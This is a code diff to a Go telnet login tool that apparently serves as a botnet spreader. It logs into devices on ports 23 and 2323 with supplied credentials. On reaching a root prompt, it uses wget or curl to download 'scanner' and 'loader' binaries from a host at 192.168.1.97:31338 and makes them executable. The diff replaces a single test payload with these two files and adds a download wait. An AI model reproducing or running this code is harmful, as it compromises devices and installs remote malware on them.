@@ -51,13 +51,22 @@ func login23(usr string , psw string,ip string,port string){
 			if strings.Contains(s,"#"){
 				conn.Write([]byte("which wget && curl"+"\n"))
 				if strings.Contains(s,"wget"){
-					conn.Write([]byte("wget http://192.168.1.97:31338/test"+"\n"))
-					conn.Write([]byte("chmod +x test"+"\n"))
+					cmd:="wget http://192.168.1.97:31338/scanner"+" && "+"wget http://192.168.1.97:31338/loader"
+					//conn.Write([]byte("wget http://192.168.1.97:31338/scanner"+"\n"))
+					//time.Sleep(10 * time.Second)
+					//conn.Write([]byte("wget http://192.168.1.97:31338/loader"+"\n"))
+					conn.Write([]byte(cmd+"\n"))
+					time.Sleep(30 * time.Second) //等待下載時間，若執行執行則會因為檔案未下載完而載入失敗
+					conn.Write([]byte("chmod +x scanner"+"\n"))
+					conn.Write([]byte("chmod +x loader"+"\n"))
+					time.Sleep(1*time.Second)
 					return
 				}
 				if strings.Contains(s,"curl"){
-					conn.Write([]byte("curl -o http://192.168.1.97:31338/test"+"\n"))
-					conn.Write([]byte("chmod +x test"+"\n"))
+					conn.Write([]byte("curl http://192.168.1.97:31338/scanner -o scanner"+"\n"))
+					conn.Write([]byte("curl http://192.168.1.97:31338/loader -o loader"+"\n"))
+					conn.Write([]byte("chmod +x scanner"+"\n"))
+					conn.Write([]byte("chmod +x loader"+"\n"))
 					return
 				}
 			}
@@ -75,6 +84,7 @@ func main(){
 		switch os.Args[4] {
 			case "23":
 				//login23("admin","password","192.168.1.181","23")	
+				fmt.Println("In here")
 				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
 			case "2323":
 				//login23("admin","password","192.168.1.181","23")	
